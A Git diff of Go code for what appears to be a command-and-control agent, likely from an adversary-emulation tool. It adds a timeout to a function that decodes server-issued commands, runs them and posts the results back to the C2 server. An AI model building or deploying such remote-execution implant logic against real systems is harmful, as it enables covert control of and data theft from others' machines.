@@ -11,9 +11,15 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
+	"time"
 
 	"../execute"
 	"../util"
+)
+
+const (
+	// TIMEOUT in seconds represents how long a single command should run before timing out
+	TIMEOUT = 300
 )
 
 // Instructions is a single call to the C2
@@ -57,11 +63,30 @@ func Drop(server string, payload string) {
 
 // Execute executes a command and posts results
 func Execute(profile map[string]interface{}, command map[string]interface{}) {
+	timeoutChan := make(chan bool, 1)
+	resultChan := make(chan []byte, 1)
+	errorChan := make(chan bool, 1)
 	cmd := string(util.Decode(command["command"].(string)))
 	status := "0"
-	result, err := execute.Execute(cmd, command["executor"].(string))
-	if err != nil {
-		status = "1"
+	var result []byte
+	go func() {
+		time.Sleep(TIMEOUT * time.Second)
+		timeoutChan <- true
+	}()
+	go execute.Execute(cmd, command["executor"].(string), resultChan, errorChan)
+loop:
+	for {
+		select {
+		case <-errorChan:
+			status = "1"
+		case data := <-resultChan:
+			result = data
+			break loop
+		case <-timeoutChan:
+			result = []byte("Command execution timed out.")
+			status = "2"
+			break loop
+		}
 	}
 	address := fmt.Sprintf("%s/sand/results", profile["server"])
 	link := fmt.Sprintf("%f", command["id"].(float64))
